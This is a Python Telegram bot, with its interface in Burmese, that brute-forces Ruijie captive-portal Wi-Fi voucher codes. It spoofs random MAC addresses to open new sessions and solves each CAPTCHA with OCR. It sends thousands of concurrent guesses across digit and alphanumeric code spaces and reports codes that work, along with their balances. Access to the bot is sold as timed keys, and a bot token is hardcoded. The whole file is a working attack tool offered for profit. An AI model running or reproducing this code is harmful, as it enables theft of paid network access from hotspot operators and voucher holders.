#!/usr/bin/env python3
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
import os
import gc
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ── DATABASE FILE FOR PERSISTENCE ────────────────────────────────────────
DB_FILE = "database.json"

# ── KEEP-ALIVE SERVER (FOR REPLIT 24/7) ──────────────────────────────────
app = Flask('')

@app.route('/')
def home():
    return "Bot is running 24/7!"

def run_http():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_http)
    t.start()

# ── CONFIGURATION ────────────────────────────────────────────────────────
BOT_TOKEN = "8680048736:AAH7s2i3EuocZtXCtzb1HYBOpGP54JaGUvE"
ADMIN_ID = 8937162965

BATCH_SIZE = 500        
MAX_CONCURRENT = 3000     
CONNECTION_LIMIT = 1500
TIMEOUT = 25

# ── GLOBALS & PERSISTENCE FUNCTIONS ──────────────────────────────────────
_connector = None
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)
MIXED_CHARS = list(string.ascii_lowercase + string.digits)

user_scans = {}
authorized_users = {ADMIN_ID: {"expiry": datetime.max, "blocked": False}}
generated_keys = {} 
bot_locked = False
waiting_for_key = set()

def load_data():
    global authorized_users, generated_keys
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                loaded_users = data.get("authorized_users", {})
                for uid_str, info in loaded_users.items():
                    uid = int(uid_str)
                    exp_str = info["expiry"]
                    expiry = datetime.max if exp_str == "max" else datetime.fromisoformat(exp_str)
                    authorized_users[uid] = {"expiry": expiry, "blocked": info["blocked"]}
                
                loaded_keys = data.get("generated_keys", {})
                for k, seconds in loaded_keys.items():
                    generated_keys[k] = timedelta(seconds=seconds)
        except Exception as e:
            print(f"Error loading database: {e}")

def save_data():
    try:
        data_users = {}
        for uid, info in authorized_users.items():
            exp = info["expiry"]
            exp_str = "max" if exp == datetime.max else exp.isoformat()
            data_users[str(uid)] = {"expiry": exp_str, "blocked": info["blocked"]}
        
        data_keys = {}
        for k, td in generated_keys.items():
            data_keys[k] = td.total_seconds()
            
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump({"authorized_users": data_users, "generated_keys": data_keys}, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"Error saving database: {e}")

# ── OCR INITIALIZATION ───────────────────────────────────────────────────
def init_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        init_ocr()
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

# ── HELPER FUNCTIONS ─────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def format_time(seconds):
    if seconds == float('inf') or seconds <= 0:
        return "N/A"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

# ── GENERATORS ──────────────────────────────────────────────────────────

def iter_lowercase(length=6):
    chars = LOWERCASE_CHARS
    common = ['admin', 'guest', 'user', 'pass', 'test', 'login', 'root', 'wifi']
    for word in common:
        if len(word) <= length:
            padded = word.ljust(length, 'a')
            if len(padded) == length:
                yield padded
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_mixed(length=6):
    chars = MIXED_CHARS
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_digit_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if mode in ["6", "7"]:
            if start_digit is not None:
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return
            else:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
                return
        if mode == "8":
            ranges = list(range(0, 100, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(8) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
        elif mode == "9":
            ranges = list(range(0, 1000, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(9) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()

# ── CAPTCHA & RUIJIE API (WITHOUT PROXY) ─────────────────────────────────

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1) if sid else prev_sid
    except Exception:
        return prev_sid

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=5) as req:
            return await req.read()
    except Exception:
        return None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
    try:
        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=5) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception:
        return None

async def get_balance_info(session_id):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'application/json'}
    
    async with aiohttp.ClientSession() as temp_session:
        for url in endpoints:
            try:
                async with temp_session.get(url, headers=headers, timeout=8) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    if not data.get("success", False):
                        continue
                    result = data.get("result", {}) or data.get("data", {})
                    
                    minutes = None
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance']:
                        if key in result and result[key] is not None:
                            minutes = result[key]
                            break
                    if minutes is None:
                        continue
                    
                    plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                    mins_float = float(minutes)
                    
                    if mins_float <= 0:
                        display = "⏳ Expired"
                    elif mins_float >= 999999:
                        display = "♾️ Unlimited"
                    else:
                        total_secs = mins_float * 60
                        if total_secs > 86400:
                            display = f"⏱ {int(total_secs/86400)}d {int((total_secs%86400)/3600)}h"
                        elif total_secs > 3600:
                            display = f"⏱ {int(total_secs/3600)}h {int((total_secs%3600)/60)}m"
                        else:
                            display = f"⏱ {int(mins_float)}m"
                    
                    return f"📋 {plan_name} | {display}"
            except Exception:
                continue
    return "📋 Unknown | ⏱ N/A"

async def perform_check(session_url, code):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    timeout = aiohttp.ClientTimeout(total=10, connect=3)
    
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return None
            
            image = await Captcha_Image(task_session, session_id)
            if not image:
                return None
            text = await Captcha_Text(image)
            if not text:
                return None
            if not await Varify_Captcha(task_session, session_id, text):
                return None
            
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
            headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
            
            async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
                response = await req.text()
                if 'logonUrl' in response:
                    balance_display = await get_balance_info(session_id)
                    return {"code": code, "balance": balance_display}
    except Exception:
        return None
    return None

# ── CHECK USER ACCESS & MIDDLEWARE ───────────────────────────────────────

def check_access(user_id: int) -> tuple[bool, str]:
    global bot_locked
    if bot_locked and not is_admin(user_id):
        return False, "🔒 Bot အား Admin မှ ခေတ္တပိတ်ထားပါသည်။"
    
    if user_id not in authorized_users:
        if not is_admin(user_id):
            return False, "❌ သင့်တွင် အသုံးပြုခွင့် (Key) မရှိသေးပါ။ အောက်ပါ **🔑 Key ထည့်ရန်** ခလုတ်ကိုနှိပ်၍ Key ထည့်ပါ သို့မဟုတ် Key ဝယ်ယူရန် `@Hann13` သို့ ဆက်သွယ်ပါ။"
    
    user_info = authorized_users.get(user_id, {"expiry": datetime.now(), "blocked": False})
    if user_info["blocked"]:
        return False, "❌ သင့်အကောင့်ကို Bot အသုံးပြုခွင့်မှ ပိတ်ပင်ထား (Block) ထားပါသည်။"
    
    if datetime.now() > user_info["expiry"] and not is_admin(user_id):
        return False, "⏳ သင့်အသုံးပြုခွင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ။ Key ထပ်ထည့်ရန် **🔑 Key ထည့်ရန်** ကို နှိပ်ပါ။"
    
    return True, "OK"

def get_main_keyboard(user_id):
    if is_admin(user_id):
        kb = [
            [KeyboardButton("🚀 Start Scanner"), KeyboardButton("📊 My Status")],
            [KeyboardButton("🔑 Generate Keys"), KeyboardButton("👥 User Management")],
            [KeyboardButton("🔒 Lock/Unlock Bot"), KeyboardButton("🛒 Key ဝယ်ရန် (@Hann13)")]
        ]
    else:
        kb = [
            [KeyboardButton("🚀 Start Scanner"), KeyboardButton("📊 My Status")],
            [KeyboardButton("🔑 Key ထည့်ရန်"), KeyboardButton("🛒 Key ဝယ်ရန် (@Hann13)")]
        ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

# ── TELEGRAM HANDLERS ────────────────────────────────────────────────    

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if user_id not in authorized_users and not is_admin(user_id):
        authorized_users[user_id] = {"expiry": datetime.now() - timedelta(seconds=1), "blocked": False}
        save_data()

    if user_id not in user_scans:
        user_scans[user_id] = {'url': None, 'running': False, 'mode': '6', 'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None}
    
    welcome_msg = (
        f"🔥 **RUIJIE EXTREME SCANNER BOT** 🔥\n\n"
        f"ကြိုဆိုပါတယ် {user.first_name}!\n"
        f"အောက်ပါ Menu ကိုအသုံးပြု၍ Ruijie Voucher Code များကို ရှာဖွေနိုင်ပါသည်။"
    )
    await update.message.reply_text(welcome_msg, reply_markup=get_main_keyboard(user_id), parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = update.message.text.strip()

    if text == "🔑 Key ထည့်ရန်":
        waiting_for_key.add(user_id)
        await update.message.reply_text(
            "🔑 ကျေးဇူးပြု၍ Admin ထံမှ ရရှိထားသော **Key ကို ပို့ပေးပါ** (ဥပမာ - `KEY-XXXXXXXX`):",
            reply_markup=get_main_keyboard(user_id),
            parse_mode='Markdown'
        )
        return

    if user_id in waiting_for_key:
        waiting_for_key.remove(user_id)
        if text in generated_keys:
            delta_val = generated_keys.pop(text)
            if user_id in authorized_users:
                current_expiry = authorized_users[user_id]["expiry"]
                if current_expiry < datetime.now():
                    current_expiry = datetime.now()
                authorized_users[user_id]["expiry"] = current_expiry + delta_val
            else:
                authorized_users[user_id] = {"expiry": datetime.now() + delta_val, "blocked": False}
            save_data()
            await update.message.reply_text(f"✅ Key အောင်မြင်စွာ ဖွင့်ပြီးပါပြီ! သက်တမ်း တိုးမြှင့်ပေးလိုက်ပါသည်။", reply_markup=get_main_keyboard(user_id))
        else:
            await update.message.reply_text("❌ မှားယွင်းနေသော (သို့) အသုံးပြုပြီးသား Key ဖြစ်ပါသည်။", reply_markup=get_main_keyboard(user_id))
        return

    if text.startswith("KEY-"):
        if text in generated_keys:
            delta_val = generated_keys.pop(text)
            if user_id in authorized_users:
                current_expiry = authorized_users[user_id]["expiry"]
                if current_expiry < datetime.now():
                    current_expiry = datetime.now()
                authorized_users[user_id]["expiry"] = current_expiry + delta_val
            else:
                authorized_users[user_id] = {"expiry": datetime.now() + delta_val, "blocked": False}
            save_data()
            await update.message.reply_text(f"✅ Key အောင်မြင်စွာ ဖွင့်ပြီးပါပြီ! သက်တမ်း တိုးမြှင့်ပေးလိုက်ပါသည်။", reply_markup=get_main_keyboard(user_id))
        else:
            await update.message.reply_text("❌ မှားယွင်းနေသော (သို့) အသုံးပြုပြီးသား Key ဖြစ်ပါသည်။", reply_markup=get_main_keyboard(user_id))
        return

    allowed, reason = check_access(user_id)
    if not allowed:
        await update.message.reply_text(reason, reply_markup=get_main_keyboard(user_id), parse_mode='Markdown')
        return

    if user_id not in user_scans:
        user_scans[user_id] = {'url': None, 'running': False, 'mode': '6', 'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None}

    if text == "🚀 Start Scanner":
        await update.message.reply_text("🔗 ကျေးဇူးပြု၍ Portal URL ကို ပေးပို့ပါ:\n(ဥပမာ - `https://portal-as.ruijienetworks.com/.../index.html?mac=xx:xx...`)", parse_mode='Markdown')
        return
    elif text == "📊 My Status":
        await show_status_func(update, context)
        return
    elif text == "🛒 Key ဝယ်ရန် (@Hann13)":
        await update.message.reply_text("🛒 Key ဝယ်ယူလိုပါက Admin `@Hann13` ထံသို့ တိုက်ရိုက်ဆက်သွယ်နိုင်ပါသည်။", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 ဆက်သွယ်ရန် @Hann13", url="https://t.me/Hann13")]]))
        return
    elif text == "🔑 Generate Keys" and is_admin(user_id):
        await admin_key_menu(update, context)
        return
    elif text == "👥 User Management" and is_admin(user_id):
        await admin_user_management(update, context)
        return
    elif text == "🔒 Lock/Unlock Bot" and is_admin(user_id):
        global bot_locked
        bot_locked = not bot_locked
        status_text = "ပိတ်လိုက်ပါပြီ 🔒" if bot_locked else "ဖွင့်လိုက်ပါပြီ 🔓"
        await update.message.reply_text(f"⚠️ Bot အခြေအနေကို {status_text}", reply_markup=get_main_keyboard(user_id))
        return

    if "portal-as.ruijienetworks.com" in text or "mac=" in text:
        if "mac=" not in text:
            text += "&mac=02:00:00:00:00:00" if "?" in text else "?mac=02:00:00:00:00:00"
        
        user_scans[user_id]['url'] = text
        await show_main_menu_panel(update, context)
    else:
        await update.message.reply_text("❌ မှန်ကန်သော Portal URL မဟုတ်ပါ။")

async def show_status_func(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    user_info = authorized_users.get(user_id, {"expiry": datetime.now(), "blocked": False})
    
    expiry_time = user_info["expiry"]
    if expiry_time == datetime.max:
        time_left = "♾️ Unlimited (Admin)"
    else:
        remaining = expiry_time - datetime.now()
        if remaining.total_seconds() <= 0:
            time_left = "⏳ သက်တမ်းကုန်ဆုံးပါပြီ"
        else:
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            time_left = f"⏱ {days}d {hours}h {minutes}m ကျန်ရှိသည်"

    state = user_scans.get(user_id, {'found_codes': []})
    found_count = len(state['found_codes'])

    msg = (
        f"📊 **User Status & Info**\n\n"
        f"👤 **Name:** {user.first_name}\n"
        f"🆔 **Telegram ID:** `{user_id}`\n"
        f"🏷 **Username:** @{user.username if user.username else 'None'}\n"
        f"⏳ **Subscription:** {time_left}\n"
        f"✅ **Total Found Codes:** {found_count} ခု\n"
    )
    
    keyboard = [
        [InlineKeyboardButton("📋 တွေ့ရှိထားသော Code များကြည့်ရန်", callback_data="view_codes")],
        [InlineKeyboardButton("🛒 Key ဝယ်ရန် (@Hann13)", url="https://t.me/Hann13")]
    ]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def show_main_menu_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_scans[user_id]
    
    keyboard = [
        [InlineKeyboardButton("🔢 Mode ရွေးချယ်ရန်", callback_data="select_mode")],
        [InlineKeyboardButton("🚀 Scan စတင်ရန်", callback_data="start_scan"), InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")],
        [InlineKeyboardButton("📋 တွေ့ရှိထားသော Code များ", callback_data="view_codes")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    status = "🟢 Running" if state['running'] else "🔴 Stopped"
    msg = (
        f"⚙️ **Scanner Control Panel**\n\n"
        f"🔗 **URL:** `{state['url'][:35]}...`\n"
        f"📊 **Mode:** `{state['mode']}`\n"
        f"⚡ **Status:** {status}\n"
        f"✅ **Found:** {len(state['found_codes'])} codes\n"
    )
    
    if update.message:
        await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(msg, reply_markup=reply_markup, parse_mode='Markdown')

# ── ADMIN MANAGEMENT FUNCTIONS ─────────────────────────────────────────────

async def admin_key_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("15 Mins Key", callback_data="gen_15m"), InlineKeyboardButton("1 Hour Key", callback_data="gen_1h")],
        [InlineKeyboardButton("1 Day Key", callback_data="gen_1"), InlineKeyboardButton("7 Days Key", callback_data="gen_7")],
        [InlineKeyboardButton("30 Days Key", callback_data="gen_30"), InlineKeyboardButton("Unlimited Key", callback_data="gen_365")]
    ]
    await update.message.reply_text("🔑 **ထုတ်လိုသည့် Key သက်တမ်းကို ရွေးချယ်ပါ:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def admin_user_management(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "👥 **User Management (Acc Name & Codes View):**\n\n"
    keyboard = []
    
    for uid, info in authorized_users.items():
        if uid == ADMIN_ID:
            continue
        
        try:
            chat_obj = await context.bot.get_chat(uid)
            acc_name = chat_obj.first_name or "Unknown"
            username = f"@{chat_obj.username}" if chat_obj.username else "No Username"
        except Exception:
            acc_name = "Unknown"
            username = "No Username"

        user_codes_count = len(user_scans.get(uid, {}).get('found_codes', []))
        status = "🚫 Blocked" if info["blocked"] else "🟢 Active"

        msg += f"👤 **{acc_name}** ({username})\n🆔 ID: `{uid}` | Codes: {user_codes_count} ခု | {status}\n\n"
        
        action_text = f"Unblock" if info["blocked"] else f"Block"
        keyboard.append([
            InlineKeyboardButton(f"{action_text} ({acc_name})", callback_data=f"toggle_block_{uid}"),
            InlineKeyboardButton(f"View Codes ({user_codes_count})", callback_data=f"admin_view_user_{uid}")
        ])
    
    if len(keyboard) == 0:
        msg += "📭 အခြားအသုံးပြုသူ မရှိသေးပါ။"

    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    allowed, reason = check_access(user_id)
    if not allowed and not is_admin(user_id):
        await query.answer(reason, show_alert=True)
        return

    await query.answer()
    data = query.data

    if data.startswith("gen_") and is_admin(user_id):
        mode_val = data.replace("gen_", "")
        
        if mode_val == "15m":
            delta_val = timedelta(minutes=15)
            label_name = "၁၅ မိနစ်"
        elif mode_val == "1h":
            delta_val = timedelta(hours=1)
            label_name = "၁ နာရီ"
        elif mode_val == "365":
            delta_val = timedelta(days=365)
            label_name = "Unlimited"
        else:
            days_int = int(mode_val)
            delta_val = timedelta(days=days_int)
            label_name = f"{days_int} ရက်"

        random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        key_name = f"KEY-{random_str}"
        generated_keys[key_name] = delta_val
        save_data()
        
        await query.edit_message_text(
            f"✅ **Key အောင်မြင်စွာ ဖန်တီးပြီးပါပြီ!**\n\n"
            f"🔑 Key: `{key_name}`\n"
            f"⏳ သက်တမ်း: {label_name}", 
            parse_mode='Markdown'
        )
        return

    if data.startswith("toggle_block_") and is_admin(user_id):
        target_id = int(data.replace("toggle_block_", ""))
        if target_id in authorized_users:
            current_status = authorized_users[target_id]["blocked"]
            authorized_users[target_id]["blocked"] = not current_status
            save_data()
            await query.edit_message_text(f"✅ User ID `{target_id}` ၏ Block အခြေအနေကို ပြောင်းလဲပြီးပါပြီ။", parse_mode='Markdown')
        return

    if data.startswith("admin_view_user_") and is_admin(user_id):
        target_id = int(data.replace("admin_view_user_", ""))
        user_codes = user_scans.get(target_id, {}).get('found_codes', [])
        
        try:
            chat_obj = await context.bot.get_chat(target_id)
            acc_name = chat_obj.first_name or "Unknown"
        except Exception:
            acc_name = "Unknown"

        if not user_codes:
            text = f"📭 User: **{acc_name}** (`{target_id}`) တွင် တွေ့ရှိထားသော Code မရှိသေးပါ။"
        else:
            text = f"🔥 **User: {acc_name} (`{target_id}`) တွေ့ရှိထားသော Code များ:**\n\n"
            for i, c in enumerate(user_codes, 1):
                text += f"{i}. Code: `{c['code']}` | {c['balance']}\n"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_users")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data == "back_to_users" and is_admin(user_id):
        await admin_user_management(update, context)
        return

    if user_id not in user_scans:
        user_scans[user_id] = {'url': None, 'running': False, 'mode': '6', 'found_codes': [], 'checked': 0, 'start_time': 0, 'task': None}
    state = user_scans[user_id]

    if data == "select_mode":
        keyboard = [
            [InlineKeyboardButton("6 Digit", callback_data="set_6"), InlineKeyboardButton("7 Digit", callback_data="set_7")],
            [InlineKeyboardButton("8 Digit", callback_data="set_8"), InlineKeyboardButton("9 Digit", callback_data="set_9")],
            [InlineKeyboardButton("Lower 6 (a-z)", callback_data="set_lower6"), InlineKeyboardButton("Mixed 6", callback_data="set_mixed6")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
        ]
        await query.edit_message_text("🔢 **Scan ပြုလုပ်လိုသည့် Mode ကို ရွေးပါ:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    elif data.startswith("set_"):
        mode = data.replace("set_", "")
        state['mode'] = mode
        await query.edit_message_text(f"✅ Mode ကို **{mode}** သို့ ပြောင်းလဲပြီးပါပြီ။")
        await asyncio.sleep(1)
        await show_main_menu_panel(update, context)

    elif data == "start_scan":
        if state['running']:
            await query.edit_message_text("⚠️ Scan သည် ပတ်နေဆဲဖြစ်သည်။")
            return
        if not state['url']:
            await query.edit_message_text("❌ URL မရှိသေးပါ။ URL အရင် ပို့ပေးပါ။")
            return
        
        state['running'] = True
        state['checked'] = 0
        state['start_time'] = time.time()
        state['task'] = asyncio.create_task(run_scan_task(user_id, context, query.message.chat_id, query.message.message_id))
        await query.edit_message_text("🚀 **Scan စတင်နေပါပြီ...**")

    elif data == "stop_scan":
        if state['running']:
            state['running'] = False
            if state['task']:
                state['task'].cancel()
            await query.edit_message_text("⏹️ Scan ကို ရပ်တန့်လိုက်ပါပြီ။")
        else:
            await query.edit_message_text("⚠️ ရပ်စရာ Scan မရှိပါ။")

    elif data == "view_codes":
        codes = state['found_codes']
        if not codes:
            text = "📭 မည်သည့် Code မှ ရှာမတွေ့သေးပါ။"
        else:
            text = "🔥 **သင့်တွေ့ရှိထားသော Code များ:**\n\n"
            for i, c in enumerate(codes, 1):
                text += f"{i}. Code: `{c['code']}` | {c['balance']}\n"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    elif data == "main_menu":
        await show_main_menu_panel(update, context)

# ── BACKGROUND SCAN TASK ────────────────────────────────────────────────

async def run_scan_task(user_id, context, chat_id, message_id):
    state = user_scans[user_id]
    mode = state['mode']
    
    if mode.startswith("mixed"):
        code_iter = iter_mixed(int(mode.replace("mixed", "")))
    elif mode.startswith("lower"):
        code_iter = iter_lowercase(int(mode.replace("lower", "")))
    else:
        code_iter = iter_digit_codes(mode)

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def _worker(code):
        async with sem:
            if not state['running']:
                return None
            return await perform_check(state['url'], code)

    last_update_time = time.time()

    try:
        while state['running']:
            batch = [next(code_iter) for _ in range(BATCH_SIZE)]
            results = await asyncio.gather(*[_worker(c) for c in batch])

            for res in results:
                if res:
                    state['found_codes'].append(res)
                    try:
                        user_obj = await context.bot.get_chat(user_id)
                        acc_name = user_obj.first_name or "Unknown"
                        username = f"@{user_obj.username}" if user_obj.username else "No Username"
                    except Exception:
                        acc_name = "Unknown"
                        username = "No Username"
                    
                    notif_text = (
                        f"🎉 **Code သစ်တွေ့ရှိသည်!**\n\n"
                        f"👤 **Acc Name:** {acc_name} ({username})\n"
                        f"🆔 **Telegram ID:** `{user_id}`\n"
                        f"🔑 **Code:** `{res['code']}`\n"
                        f"{res['balance']}"
                    )
                    await context.bot.send_message(chat_id=chat_id, text=notif_text, parse_mode='Markdown')
                    if user_id != ADMIN_ID:
                        try:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🚨 [Admin Alert]\n{notif_text}", parse_mode='Markdown')
                        except Exception:
                            pass

            state['checked'] += len(batch)

            if time.time() - last_update_time > 5:
                elapsed = time.time() - state['start_time']
                speed = (state['checked'] / elapsed * 60) if elapsed > 0 else 0
                
                status_msg = (
                    f"⚡ **Scanning In Progress...**\n\n"
                    f"📊 **Mode:** `{mode}`\n"
                    f"📦 **Checked:** {state['checked']:,}\n"
                    f"⚡ **Speed:** {speed:,.0f} /min\n"
                    f"✅ **Found:** {len(state['found_codes'])}\n"
                    f"⏱ **Time:** {format_time(elapsed)}"
                )
                keyboard = [[InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")]]
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_msg,
                        reply_markup=InlineKeyboardMarkup(keyboard),
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass
                last_update_time = time.time()

            await asyncio.sleep(0.1)

    except asyncio.CancelledError:
        pass
    finally:
        state['running'] = False

# ── MAIN BOT RUNNER ──────────────────────────────────────────────────────

async def post_init(application: Application):
    global _connector
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, enable_cleanup_closed=False)

def main():
    load_data()  # ဒေတာများကို ဖတ်ရှုရန်
    keep_alive()
    
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Telegram Bot Running Successfully...")
    app.run_polling()

if __name__ == '__main__':
    main()
